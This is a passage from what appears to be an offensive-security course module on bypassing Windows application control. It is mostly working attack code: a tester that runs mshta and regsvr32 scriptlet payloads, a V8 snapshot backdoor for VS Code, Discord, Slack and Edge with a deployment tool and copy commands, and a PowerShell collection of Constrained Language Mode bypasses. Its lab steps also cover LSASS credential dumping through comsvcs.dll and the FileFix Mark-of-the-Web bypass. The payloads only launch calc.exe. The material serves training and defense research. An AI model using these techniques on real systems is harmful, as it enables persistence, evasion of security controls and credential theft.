    GetExitCodeProcess(pi.hProcess, &exitCode);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (success) {
        printf("[+] SUCCESS: calc.exe launched via mshta\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
        DeleteFileA(htaPath);
        return TRUE;
    } else {
        printf("[-] BLOCKED: Script execution restricted by system policy\n");
        printf("[*] Likely cause: ASR rules, AppLocker, or WDAC blocking ActiveX/WScript\n");
        printf("[*] File saved for inspection: %s\n", htaPath);
        return FALSE;
    }
}

BOOL TestRegsvr32Payload(const char* sctPath) {
    FILE* f = fopen(sctPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", sctPath);
        return FALSE;
    }

    fprintf(f,
"<?XML version=\"1.0\"?>\n"
"<scriptlet>\n"
"<registration progid=\"X\" classid=\"{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\"/>\n"
"<script language=\"VBScript\">\n"
"<![CDATA[\n"
"Set objShell = CreateObject(\"WScript.Shell\")\n"
"objShell.Run \"cmd.exe /c start calc.exe\", 0, False\n"
"WScript.Sleep 3000\n"
"]]>\n"
"</script>\n"
"</scriptlet>\n");

    fclose(f);
    printf("[+] Generated: %s\n", sctPath);

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine),
             "regsvr32.exe /s /n /u /i:\"%s\" scrobj.dll", sctPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing regsvr32 payload...\n");
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        printf("[-] Failed to execute (error: %lu)\n", err);
        DeleteFileA(sctPath);
        return FALSE;
    }

    Sleep(1500);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");

    DWORD exitCode = STILL_ACTIVE;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (success) {
        printf("[+] SUCCESS: calc.exe launched via regsvr32\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
        DeleteFileA(sctPath);
        return TRUE;
    } else {
        printf("[-] BLOCKED: Scriptlet execution restricted by system policy\n");
        printf("[*] Likely cause: scrobj.dll disabled via ASR rules or WDAC\n");
        printf("[*] File saved for inspection: %s\n", sctPath);
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    printf("===========================================\n");
    printf("WDAC Bypass Tester\n");
    printf("===========================================\n\n");

    if (argc < 2) {
        printf("Usage: %s <technique>\n\n", argv[0]);
        printf("Techniques:\n");
        printf("  msbuild    - Test MSBuild bypass\n");
        printf("  installutil - Test InstallUtil bypass\n");
        printf("  mshta      - Test mshta bypass\n");
        printf("  regsvr32   - Test regsvr32 bypass\n");
        printf("  all        - Test all techniques\n");
        return 1;
    }

    const char* technique = argv[1];
    int total = 0, passed = 0;

    if (strcmp(technique, "msbuild") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestMSBuildPayload("test_build.xml")) passed++;
    }

    if (strcmp(technique, "installutil") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestInstallUtilPayload("test_install.cs", "test_install.dll")) passed++;
    }

    if (strcmp(technique, "mshta") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestMshtaPayload("test_app.hta")) passed++;
    }

    if (strcmp(technique, "regsvr32") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestRegsvr32Payload("test_script.sct")) passed++;
    }

    printf("\n===========================================\n");
    printf("Results: %d/%d techniques working\n", passed, total);
    printf("===========================================\n");

    return (passed == total) ? 0 : 1;
}
```

**Compile and Run**

```bash
cl src\wdac_bypass_tester.c /Fe:bin\wdac_bypass_tester.exe user32.lib
.\bin\wdac_bypass_tester.exe all
# should see calc.exe popping
```

#### Technique 2: V8 Snapshot Backdooring

```javascript
// v8_snapshot_payload.js - Malicious V8 heap snapshot gadget
// Using process.env flag to prevent multiple executions

const origArrayIsArray = Array.isArray;
let executionAttempted = false;

Array.isArray = function () {
  const result = origArrayIsArray.apply(this, arguments);

  if (!executionAttempted) {
    executionAttempted = true;

    setTimeout(() => {
      try {
        // Check if already executed using environment variable
        if (process.env._V8_BACKDOOR_EXECUTED) {
          console.log("[BACKDOOR] Already executed");
          return;
        }

        // Set flag to prevent other processes from executing
        process.env._V8_BACKDOOR_EXECUTED = "1";

        console.log("[BACKDOOR] Executing...");

        const { spawn } = process.binding("spawn_sync");

        const spawnResult = spawn({
          file: process.env.ComSpec || "C:\\Windows\\System32\\cmd.exe",
          args: ["/c", "start", "calc.exe"],
          cwd: undefined,
          detached: false,
          windowsVerbatimArguments: false,
          windowsHide: false,
          stdio: [{ type: "ignore" }, { type: "ignore" }, { type: "ignore" }],
        });

        console.log(
          "[BACKDOOR] Result:",
          spawnResult.error === 0
            ? "SUCCESS - calc.exe launched!"
            : "Error: " + spawnResult.error,
        );
      } catch (e) {
        console.log("[BACKDOOR] Error:", e.message);
      }
    }, 100);
  }

  return result;
};
```

Deployment tool (C implementation):

```c
// deploy_v8_backdoor.c
// Compile: cl src\deploy_v8_backdoor.c /Fe:bin\deploy_v8_backdoor.exe shell32.lib version.lib

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

BOOL GetV8Version(const char* exePath, char* outVersion, size_t outSize) {
    DWORD handle;
    DWORD size = GetFileVersionInfoSizeA(exePath, &handle);
    if (size == 0) return FALSE;

    BYTE* versionInfo = (BYTE*)malloc(size);
    if (!versionInfo) return FALSE;

    if (!GetFileVersionInfoA(exePath, handle, size, versionInfo)) {
        free(versionInfo);
        return FALSE;
    }

    VS_FIXEDFILEINFO* fileInfo;
    UINT len;
    if (VerQueryValueA(versionInfo, "\\", (LPVOID*)&fileInfo, &len)) {
        snprintf(outVersion, outSize, "%d.%d.%d.%d",
                HIWORD(fileInfo->dwFileVersionMS),
                LOWORD(fileInfo->dwFileVersionMS),
                HIWORD(fileInfo->dwFileVersionLS),
                LOWORD(fileInfo->dwFileVersionLS));
        free(versionInfo);
        return TRUE;
    }

    free(versionInfo);
    return FALSE;
}

BOOL GetElectronVersion(const char* appPath, char* outVersion, size_t outSize) {
    // Try to find version.txt or similar
    char versionFile[MAX_PATH];
    snprintf(versionFile, sizeof(versionFile), "%s\\version", appPath);

    FILE* f = fopen(versionFile, "r");
    if (f) {
        if (fgets(outVersion, outSize, f)) {
            // Remove newline
            char* newline = strchr(outVersion, '\n');
            if (newline) *newline = '\0';
            fclose(f);
            return TRUE;
        }
        fclose(f);
    }

    return FALSE;
}

BOOL FindElectronApp(char* outPath, size_t outSize, char* appName, size_t appNameSize) {
    // Check for VS Code (user install)
    char localAppData[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\Programs\\Microsoft VS Code", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "VS Code");
            return TRUE;
        }
    }

    // Check for Discord
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\Discord", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "Discord");
            return TRUE;
        }
    }

    // Check for Slack
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\slack", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "Slack");
            return TRUE;
        }
    }

    // Check for Edge (user install)
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\Microsoft\\Edge\\Application", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "Edge");
            return TRUE;
        }
    }

    // Check for Edge (system install x86)
    snprintf(outPath, outSize, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application");
    DWORD attrs = GetFileAttributesA(outPath);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        strcpy(appName, "Edge (system-wide)");
        return TRUE;
    }

    // Check for Edge (system install x64)
    snprintf(outPath, outSize, "C:\\Program Files\\Microsoft\\Edge\\Application");
    attrs = GetFileAttributesA(outPath);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        strcpy(appName, "Edge (system-wide)");
        return TRUE;
    }

    return FALSE;
}

BOOL FindVersionDir(const char* basePath, char* outPath, size_t outSize) {
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*.*", basePath);
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;

    BOOL found = FALSE;
    char latestVersion[MAX_PATH] = {0};

    do {
        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            findData.cFileName[0] >= '0' && findData.cFileName[0] <= '9') {
            if (latestVersion[0] == 0 || strcmp(findData.cFileName, latestVersion) > 0) {
                strcpy(latestVersion, findData.cFileName);
                found = TRUE;
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);

    if (found) {
        snprintf(outPath, outSize, "%s\\%s", basePath, latestVersion);
    }
    return found;
}

BOOL IsDirectoryWritable(const char* path) {
    char testFile[MAX_PATH];
    snprintf(testFile, sizeof(testFile), "%s\\__test_write__.tmp", path);

    HANDLE hFile = CreateFileA(testFile, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        DeleteFileA(testFile);
        return TRUE;
    }
    return FALSE;
}

int main() {
    printf("====================================\n");
    printf("V8 Snapshot Backdoor Deployment Tool\n");
    printf("====================================\n\n");

    char appPath[MAX_PATH];
    char appName[64];

    if (!FindElectronApp(appPath, sizeof(appPath), appName, sizeof(appName))) {
        printf("[-] No Electron apps found\n");
        printf("[*] Checked for:\n");
        printf("    - VS Code (%%LOCALAPPDATA%%\\Programs\\Microsoft VS Code)\n");
        printf("    - Discord (%%LOCALAPPDATA%%\\Discord)\n");
        printf("    - Slack (%%LOCALAPPDATA%%\\slack)\n");
        printf("    - Edge (%%LOCALAPPDATA%%\\Microsoft\\Edge\\Application)\n");
        printf("    - Edge (C:\\Program Files)\n\n");
        printf("[*] Install an Electron app:\n");
        printf("    winget install -e --id Microsoft.VisualStudioCode\n");
        return 1;
    }
    printf("[+] Found: %s\n", appName);
    printf("[+] Path: %s\n", appPath);

    BOOL isWritable = IsDirectoryWritable(appPath);
    printf("[*] Directory writable: %s\n", isWritable ? "YES (VULNERABLE!)" : "NO (requires admin)");

    char versionPath[MAX_PATH];
    if (!FindVersionDir(appPath, versionPath, sizeof(versionPath))) {
        printf("[-] Version directory not found\n");
        printf("[*] App may have different structure\n");
        return 1;
    }

    char versionOnly[MAX_PATH];
    strcpy(versionOnly, versionPath);
    char* lastSlash = strrchr(versionOnly, '\\');
    if (lastSlash) {
        printf("[+] Version: %s\n", lastSlash + 1);
    }

    // Try to find the main executable
    char exePath[MAX_PATH];
    snprintf(exePath, sizeof(exePath), "%s\\Code.exe", appPath);
    if (GetFileAttributesA(exePath) == INVALID_FILE_ATTRIBUTES) {
        snprintf(exePath, sizeof(exePath), "%s\\msedge.exe", appPath);
    }
    if (GetFileAttributesA(exePath) == INVALID_FILE_ATTRIBUTES) {
        snprintf(exePath, sizeof(exePath), "%s\\Discord.exe", appPath);
    }

    char electronVersion[64] = {0};
    if (GetElectronVersion(appPath, electronVersion, sizeof(electronVersion))) {
        printf("[+] Electron version: %s\n", electronVersion);
    }

    char fileVersion[64] = {0};
    if (GetV8Version(exePath, fileVersion, sizeof(fileVersion))) {
        printf("[+] File version: %s\n", fileVersion);
    }

    char snapshotPath[MAX_PATH];
    snprintf(snapshotPath, sizeof(snapshotPath), "%s\\v8_context_snapshot.bin", versionPath);

    DWORD snapshotAttrs = GetFileAttributesA(snapshotPath);
    if (snapshotAttrs == INVALID_FILE_ATTRIBUTES) {
        // Try alternative location (resources folder)
        snprintf(snapshotPath, sizeof(snapshotPath), "%s\\resources\\v8_context_snapshot.bin", versionPath);
        snapshotAttrs = GetFileAttributesA(snapshotPath);
    }

    if (snapshotAttrs == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Snapshot file not found\n");
        printf("[*] Checked:\n");
        printf("    - %s\\v8_context_snapshot.bin\n", versionPath);
        printf("    - %s\\resources\\v8_context_snapshot.bin\n", versionPath);
        printf("[*] App may not use V8 snapshots\n");
    } else {
        printf("[+] Target: %s\n", snapshotPath);

        WIN32_FILE_ATTRIBUTE_DATA fileInfo;
        if (GetFileAttributesExA(snapshotPath, GetFileExInfoStandard, &fileInfo)) {
            ULONGLONG fileSize = ((ULONGLONG)fileInfo.nFileSizeHigh << 32) | fileInfo.nFileSizeLow;
            printf("[*] Current size: %llu bytes\n", fileSize);
        }
    }

    printf("\n===========================================\n");
    printf("DEPLOYMENT STEPS:\n");
    printf("===========================================\n");

    if (!isWritable) {
        printf("[!] WARNING: App directory is NOT user-writable\n");
        printf("[!] This attack requires admin privileges\n");
        printf("[!] Try a different Electron app\n\n");
    }

    printf("[!] CRITICAL: V8 version must match exactly!\n");
    printf("[!] The snapshot you created uses V8 14.4.258.24-electron.0\n");
    printf("[!] %s uses V8 14.2.231.22-electron.0\n", appName);
    printf("[!] Version mismatch will cause crash on startup\n\n");

    printf("To create a matching snapshot:\n");
    printf("1. Install matching Electron version:\n");
    printf("   npm install -g electron@33.2.1\n\n");

    printf("2. Create snapshot with matching V8:\n");
    printf("   npx electron-mksnapshot --version  # Check V8 version\n");
    printf("   # Find Electron version with V8 14.2.231.22\n");
    printf("   # Then: npx electron-mksnapshot v8_snapshot_payload.js\n\n");

    printf("3. Close %s completely:\n", appName);
    printf("   taskkill /F /IM Code.exe 2>nul\n\n");

    printf("4. Backup original snapshot:\n");
    printf("   copy \"%s\" \"%s.bak\"\n\n", snapshotPath, snapshotPath);

    printf("5. Deploy backdoored snapshot:\n");
    if (isWritable) {
        printf("   copy /y v8_context_snapshot.bin \"%s\"\n\n", snapshotPath);
    } else {
        printf("   (Requires admin) copy /y v8_context_snapshot.bin \"%s\"\n\n", snapshotPath);
    }

    printf("6. Launch %s - backdoor executes on startup!\n", appName);
    printf("   Check %%TEMP%%\\edge_backdoor.log for confirmation\n");
    printf("   Calc.exe should pop up\n\n");

    printf("===========================================\n");
    printf("DETECTION & CLEANUP:\n");
    printf("===========================================\n");
    printf("Restore: copy /y \"%s.bak\" \"%s\"\n", snapshotPath, snapshotPath);
    printf("Or reinstall %s to restore integrity\n", appName);

    printf("\n===========================================\n");
    printf("OPERATIONAL CHALLENGE:\n");
    printf("===========================================\n");
    printf("V8 snapshot backdooring requires:\n");
    printf("1. Knowing target's exact Electron/V8 version\n");
    printf("2. Creating snapshot with matching V8 version\n");
    printf("3. User-writable app installation\n");
    printf("4. No integrity checking by the app\n\n");
    printf("This makes the attack complex but still viable\n");
    printf("if the attacker can fingerprint the target.\n");

    return 0;
}
```

**Compile and Run**

```bash
winget install -e --id Microsoft.VisualStudioCode
winget install -e --id OpenJS.NodeJS.LTS

cl src\deploy_v8_backdoor.c /Fe:bin\deploy_v8_backdoor.exe shell32.lib
.\bin\deploy_v8_backdoor.exe

npm install -g electron@39.3.0
npm install -g electron-mksnapshot@39.3.0
npx electron-mksnapshot "c:\Windows_Mitigations_Lab\v8_snapshot_payload.js"

# Get-Process *code* | Stop-Process -Force
copy "C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\591199df40\v8_context_snapshot.bin" "C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\591199df40\v8_context_snapshot.bin.bak"
copy /y v8_context_snapshot.bin "C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\591199df40\v8_context_snapshot.bin"

# Launch VS Code
"%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe"
#Check %TEMP%\edge_backdoor.log for confirmation
#Calc.exe should pop up
```

### Constrained Language Mode (CLM) Bypass

```powershell
# clm_bypass.ps1
# When WDAC enables Script Enforcement, PowerShell runs in CLM
# CLM blocks: Add-Type, New-Object (COM), .NET methods, unsafe cmdlets

param(
    [switch]$Execute,
    [string]$Technique = "all"
)

Write-Host @"
Current Language Mode: $($ExecutionContext.SessionState.LanguageMode)
"@

# ---- CHECK CURRENT MODE ----
function Check-LanguageMode {
    $mode = $ExecutionContext.SessionState.LanguageMode
    Write-Host "[*] Language Mode: $mode"

    switch ($mode) {
        "FullLanguage" {
            Write-Host "    -> Full access - no restrictions"
            Write-Host "    -> CLM is NOT active (no WDAC Script Enforcement)"
        }
        "ConstrainedLanguage" {
            Write-Host "    -> RESTRICTED - WDAC Script Enforcement active"
            Write-Host "    -> Blocked: Add-Type, [System.Runtime.*], COM objects"
            Write-Host "    -> Allowed: Basic cmdlets, approved modules only"
        }
        "RestrictedLanguage" {
            Write-Host "    -> VERY RESTRICTED - minimal access"
        }
        "NoLanguage" {
            Write-Host "    -> NO scripting allowed"
        }
    }
    return $mode
}

function Invoke-RunspaceBypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 1: Custom PowerShell Runspace"
    Write-Host "    Create a new runspace that doesn't inherit CLM."

    if ($Execute) {
        try {
            Write-Host "`n    [+] Attempting runspace bypass..."
            $rs = [RunspaceFactory]::CreateRunspace()
            $rs.Open()
            $ps = [PowerShell]::Create()
            $ps.Runspace = $rs
            $result = $ps.AddScript("whoami; `$ExecutionContext.SessionState.LanguageMode").Invoke()
            Write-Host "    [+] Runspace created successfully!"
            Write-Host "    [+] Result: $result"
            $rs.Close()
            $ps.Dispose()
        } catch {
            Write-Host "    [-] Failed: $($_.Exception.Message)"
            Write-Host "    [-] WDAC likely enforces CLM system-wide"
        }
    } else {
        Write-Host "    Use -Execute to run this bypass"
    }

    Write-Host "`n    NOTE: This may not work if WDAC enforces CLM system-wide."
}

function Invoke-PSv2Bypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 2: PowerShell v2 Downgrade"
    Write-Host "    PowerShell v2 doesn't support CLM!"

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($isAdmin) {
        $v2Feature = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction SilentlyContinue
    } else {
        Write-Host "    [!] Need admin to check feature status, checking binary only..."
        $v2Feature = $null
    }

    if ($v2Feature -and $v2Feature.State -eq "Enabled") {
        Write-Host "    [!!!] PowerShell v2 is ENABLED on this system!"

        if ($Execute) {
            Write-Host "`n    [+] Executing test command in PowerShell v2..."
            $result = powershell -version 2 -command "Write-Host 'Running in PSv2'; `$PSVersionTable.PSVersion; `$ExecutionContext.SessionState.LanguageMode"
            Write-Host "    [+] Result: $result"
        } else {
            Write-Host '    Execute: powershell -version 2 -command "& {your_payload}"'
        }
        Write-Host "    v2 ignores: CLM, Script Block Logging, AMSI"
    } else {
        Write-Host "    [OK] PowerShell v2 is disabled"
    }
}

function Invoke-LolbinEscape {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 3: LOLBAS Escape (InstallUtil/RegSvcs)"
    Write-Host "    NOTE: MSBuild is now blocked by AMSI on 24H2/25H2"
    Write-Host "    Use InstallUtil.exe or RegSvcs.exe instead"

    if ($Execute) {
        Write-Host "`n    [+] Generating InstallUtil payload..."

        $installUtilPayload = @'
using System;
using System.Configuration.Install;
using System.Diagnostics;

public class Program {
    public static void Main(string[] args) {
        Console.WriteLine("[*] Normal execution");
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        Console.WriteLine("[+] InstallUtil CLM Bypass Executed!");
        Console.WriteLine("[+] Process: " + Process.GetCurrentProcess().ProcessName);
        Process.Start("calc.exe");
    }
}
'@

        $csPath = ".\clm_bypass_installutil.cs"
        $installUtilPayload | Out-File -FilePath $csPath -Encoding ASCII
        Write-Host "    [+] Payload written to: $csPath"
        Write-Host "`n    [*] To execute:"
        Write-Host "    1. Compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library $csPath"
        Write-Host "    2. Execute: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U clm_bypass_installutil.dll"
    } else {
        Write-Host "    Use -Execute to generate payload files"
    }
}

function Invoke-WmicBypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 4: WMIC XSL Transform"

    $wmic = Get-Command wmic.exe -ErrorAction SilentlyContinue
    if ($wmic) {
        Write-Host "    [+] WMIC available"

        if ($Execute) {
            $xslPayload = @'
<?xml version="1.0"?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform"
            xmlns:ms="urn:schemas-microsoft-com:xslt"
            xmlns:user="placeholder" version="1.0">
  <output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]>
  </ms:script>
  <template match="/">
    <value-of select="user:a()"/>
  </template>
</stylesheet>
'@
            $xslPath = ".\clm_bypass_wmic.xsl"
            $xslPayload | Out-File -FilePath $xslPath -Encoding ASCII
            Write-Host "    [+] XSL payload written to: $xslPath"
            Write-Host "    [*] Execute: wmic process list /format:$xslPath"
        } else {
            Write-Host "    Use -Execute to generate XSL payload"
        }
    } else {
        Write-Host "    [-] WMIC not available (removed in newer Windows 11)"
    }
}

function Invoke-CimBypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 5: Approved Cmdlet Abuse (Invoke-CimMethod)"
    Write-Host "    Even in CLM, approved cmdlets like Invoke-CimMethod work"

    if ($Execute) {
        Write-Host "`n    [+] Executing calc.exe via WMI/CIM..."
        try {
            Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}
            Write-Host "    [+] Process created successfully via CIM!"
        } catch {
            Write-Host "    [-] Failed: $($_.Exception.Message)"
        }
    } else {
        Write-Host "    Use -Execute to run calc.exe via Invoke-CimMethod"
    }
}

$mode = Check-LanguageMode

if ($mode -eq "FullLanguage") {
    Write-Host "`n[!] System is in FullLanguage mode - CLM bypasses not needed"
    Write-Host "[!] Run with -Execute to test bypass techniques anyway"
}

switch ($Technique.ToLower()) {
    "runspace" { Invoke-RunspaceBypass -Execute:$Execute }
    "psv2" { Invoke-PSv2Bypass -Execute:$Execute }
    "lolbin" { Invoke-LolbinEscape -Execute:$Execute }
    "wmic" { Invoke-WmicBypass -Execute:$Execute }
    "cim" { Invoke-CimBypass -Execute:$Execute }
    default {
        Invoke-RunspaceBypass -Execute:$Execute
        Invoke-PSv2Bypass -Execute:$Execute
        Invoke-LolbinEscape -Execute:$Execute
        Invoke-WmicBypass -Execute:$Execute
        Invoke-CimBypass -Execute:$Execute
    }
}

Write-Host @"

USAGE:
  .\clm_bypass.ps1                    # Check all techniques
  .\clm_bypass.ps1 -Execute           # Execute all bypasses
  .\clm_bypass.ps1 -Technique cim -Execute  # Execute specific bypass

BYPASS ORDER:
1. Try PowerShell v2 downgrade first (if enabled)
2. If blocked, escape to InstallUtil/RegSvcs (NOT MSBuild - AMSI blocked)
3. Use Invoke-CimMethod for process creation in CLM
4. If .NET tools blocked, try WMIC XSL (if available)
5. Remember: CLM is enforced BY WDAC Script Enforcement
   -> Bypassing WDAC = bypassing CLM automatically!
"@
```

### Practical Exercise

**Lab 5.1: WDAC Policy Audit**

1. Deploy a WDAC policy in audit mode on your test VM
2. Run Event Viewer and filter for Code Integrity events (Event ID 3076/3077)
3. Analyze which binaries would be blocked in enforcement mode
4. Document the trust chain for each allowed binary
5. Test the wdac_analyzer.exe tool to enumerate active policies

**Lab 5.2: LOLBAS Execution**

1. ~~Use MSBuild.exe~~ (BLOCKED by AMSI)
2. Use InstallUtil.exe to execute a payload DLL (WORKING)
   - Compile: `csc.exe /target:library clm_bypass_installutil.cs`
   - Execute: `InstallUtil.exe /logfile= /LogToConsole=false /U clm_bypass_installutil.dll`
3. Use RegSvcs.exe to execute via COM registration (WORKING)
4. Test mshta.exe with HTA payload (if not removed in 25H2)
5. Run wdac_bypass_tester.exe to test all techniques automatically
6. Document which LOLBAS are blocked by strict WDAC policies

**Lab 5.3: ASR Rule Testing**

1. Enable all ASR rules in audit mode
2. Attempt credential theft from LSASS - observe ASR block
3. Test bypass via comsvcs.dll MiniDump method
4. Test Office child process bypass via Invoke-CimMethod (WMI)
5. Test bypass via COM automation (WScript.Shell)
6. Verify ASR doesn't monitor Electron app internals

**Lab 5.4: MotW and SAC Analysis**

1. Download a binary and observe Zone.Identifier ADS (`dir /r`)
2. Test FileFix attack
   - Save HTML as "Webpage, Complete"
   - Rename to .HTA extension
   - Verify no MotW tag applied
   - Execute and observe mshta.exe bypass
3. Test LNK file MotW bypass
4. Document SAC behavior on your test system (Evaluation/On/Off)
5. Note: SAC toggle feature is in Windows Insider testing (not production yet)

**Lab 5.5: Electron V8 Snapshot Backdooring**

1. Install VS Code or another Electron app
2. Run deploy_v8_backdoor.exe to identify target
3. Check if app directory is user-writable (vulnerability indicator)
4. Note V8 version mismatch challenges
5. Understand why this bypasses WDAC (signed app loads unsigned snapshot)

**Lab 5.6: CLM Bypass Testing**

1. Run clm_bypass.ps1 to check current language mode
2. Execute with `-Execute` flag to test all bypasses
3. Test specific bypass: `.\clm_bypass.ps1 -Technique cim -Execute`
4. Verify Invoke-CimMethod works even in CLM
5. Generate and compile InstallUtil payload to escape PowerShell entirely

### Key Takeaways

- **WDAC is the strongest execution control** - kernel-enforced, admin cannot disable
- **LOLBAS landscape changed** - MSBuild now blocked by AMSI, use InstallUtil/RegSvcs instead
- **FileFix is the newest MotW bypass** - HTML saved as "Webpage, Complete" doesn't get MotW tag
- **Electron apps are a major WDAC gap** - V8 snapshots not code-signed, can be backdoored if directory is writable
- **ASR rules are behavior-based** - bypass by using different behavior (COM instead of CreateProcess)
- **ASR doesn't monitor Electron internals** - V8 snapshot tampering, ASAR backdooring completely undetected
- **SAC toggle coming** - Currently in Windows Insider testing, will enable re-enabling after disable
- **DLL sideloading partially patched** - System DLLs protected, but OneDrive/Teams/Edge still vulnerable
- **CLM is enforced by WDAC Script Enforcement** - Bypass WDAC = bypass CLM automatically
- **Invoke-CimMethod works in CLM** - Approved cmdlets can still create processes via WMI
- **This is entirely different from exploit mitigations** - WDAC/ASR block _execution_, not _exploit success_

### Discussion Questions

1. **Can WDAC ever be truly unbypassable?** What would that require?
   - Consider: Microsoft-signed binaries must be trusted for OS to function
   - LOLBAS binaries like InstallUtil are legitimate tools with dual-use capability
   - Electron apps load unsigned V8 snapshots by design
   - Would blocking all script execution break legitimate workflows?

2. **Why did Microsoft block MSBuild but not InstallUtil/RegSvcs?**
   - MSBuild was heavily abused and got AMSI scanning in 24H2/25H2
   - InstallUtil/RegSvcs are less known but equally powerful
   - Is this security through obscurity or prioritization?
   - How long until these get blocked too?

3. **Why is Electron app backdooring such a significant WDAC bypass?**
   - Signed application (trusted by WDAC) loads unsigned snapshot
   - No integrity checking on V8 snapshots by default
   - User-writable app directories in many installations
   - Affects VS Code, Discord, Slack, Teams, Edge - widely deployed apps
   - What would it take to fix this? (Code signing snapshots? Integrity checks?)

4. **FileFix attack - why is this still unpatched?**
   - HTML saved as "Webpage, Complete" doesn't get MotW tag
   - mshta.exe is Microsoft-signed and trusted by SAC
   - Requires user interaction (save + rename)
   - Is the social engineering barrier enough security?
   - Should mshta.exe be removed entirely? (Already gone in some 25H2 builds)

5. **ASR rules vs WDAC - different layers, different bypasses**
   - ASR blocks CreateProcess from Office -> bypass with COM/WMI
   - ASR blocks LSASS access -> bypass with comsvcs.dll
   - ASR doesn't monitor Electron apps -> V8 snapshot backdooring undetected
   - Can behavior-based rules ever catch all attack variations?

6. **SAC toggle feature - security improvement or risk?**
   - Currently: Disable once = permanent (requires reinstall to re-enable)
   - Future: Toggle on/off anytime (Windows Insider testing)
   - Pros: Users won't permanently disable due to false positives
   - Cons: Social engineering to disable becomes easier
   - Which approach is more secure in practice?

7. **CLM bypass via Invoke-CimMethod - why is this allowed?**
   - CLM blocks dangerous .NET APIs but allows approved cmdlets
   - Invoke-CimMethod can create processes via WMI
   - Is this a necessary exception for legitimate admin tasks?
   - How would you design CLM to block this without breaking workflows?

8. **DLL sideloading - why are Microsoft apps still vulnerable?**
   - Windows 11 protects system DLLs (kernel32.dll, ntdll.dll)
